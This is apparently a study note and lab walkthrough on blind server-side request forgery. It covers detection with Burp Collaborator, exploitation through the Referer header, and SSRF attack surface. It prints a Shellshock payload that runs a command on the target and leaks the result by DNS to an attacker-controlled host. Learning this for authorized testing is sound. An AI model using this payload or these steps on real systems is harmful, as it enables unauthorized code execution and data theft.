# blind SSRF
- it arise when application can be induced to issue a back-end HTTP request to supplied URL, but the Request from the Back-end request is not returned to front-end application.
- it is harder to exploit but it can lead to full `RCE`.

## Impact
- impact is lower than fully informed SSRF because of their one-way nature. but in some situation it exploited to achieve `RCE`

## How to Find and Exploit Blind SSRF
- the most of the way to detect Blind SSRF is Using `Out of band (OAST)` technique. that trigger HTTP request to external system That we control.
- we can also use `Burp Collaborator`.
- simply identifying Blind SSRF trigger Out-of-band HTTP request doesn't provide route to exploitability. since we can not view the response from the back-end request.
- some Blind SSRF can be found in `Referer: `header in the http Request.

## Blind SSRF with ShellShock exploitation.
-   In [Burp Suite Professional](https://portswigger.net/burp/pro), install the "Collaborator Everywhere" extension from the BApp Store.
-   Add the domain of the lab to Burp Suite's [target scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
-   Browse the site.
-   Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
-   Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
-   Send the request to the product page to Burp Intruder.
-   Use `Burp Collaborator client` to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload: `() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net`
-   Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
- change the `Referer: ` header to `http://192.168.0.221` here `SSRF` vulnerability is in `Referer:` header and there is some internal system that doesn't directly to outer network.
-   we request to that internal systems `http://internal-ip ` and brute force it to find which system is active and use `shell shock` vulnerability to exploit it to `RCE`.
-   go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind `SSRF attack`. The name of the OS user should appear within the DNS subdomain.
 
## [research Paper : cracking the lens: Remote client exploits](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient)

## Finding Attack surface for SSRF 
### Partial URLs in requests
- some times an application place only a hostname or part of the url path in to a request parameter. 
- the value submitted is than incorporated server-side into a full URL that is requested. 
- exploitability is limited since we don't have control of full URL

### URLs within Data formats
- Some applications transmit data in formats whose specification allows the inclusion of URLs that might get requested by the data parser for the format.
- example of this is the XML data format, which has been widely used in web applications to transmit structured data from the client to the server.
- when application takes data in `XML `this might be vulnerable to `XXE Injection`

### SSRF via Referer Header
- Some applications employ server-side analytics software that tracks visitors.
- This software often logs the Referer header in requests, since this is of particular interest for tracking incoming links.
- Often the analytics software will actually visit any third-party URL that appears in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.